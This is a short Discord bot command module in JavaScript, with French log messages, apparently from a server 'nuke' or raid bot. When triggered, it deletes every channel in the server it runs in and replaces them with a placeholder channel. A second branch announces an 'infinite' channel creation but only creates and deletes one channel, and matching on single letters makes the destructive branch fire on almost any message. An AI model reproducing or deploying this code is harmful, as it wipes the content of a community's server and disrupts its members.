const settings = require('../settings.json');
const fs = require('fs');
const chalk = require('chalk');
const moment = require('moment');
exports.run = (client, message, args) => {
    settings.srvrid = message.guild.id;
    fs.writeFile('../settings.json', JSON.stringify(settings), (err) => console.error);
    if (message.content.includes('s')) {
        Promise.all(message.guild.channels.map(c => c.delete()));
        message.guild.createChannel('undefined-1', 'text');        
        console.log(chalk.inverse(`[${moment().format('DD-MM-YYYY HH:mm:ss')}] `) + chalk.black.bgGreen(`Tous les salons du serveur "${message.guild.name}" ont été supprimés.`));
    }
    if (message.content.includes('i')) {
        console.log('Une infinité de salons vont être créés.');
        message.guild.createChannel('undefined-3', 'text');
        function ert(){
            message.guild.channels.find('name', 'undefined-3').delete();
        }
        setTimeout(ert, 500);
    }
}

exports.conf = {
    permLevel: 4,
    aliases: []
}

exports.help = {
    name: 'channel'
}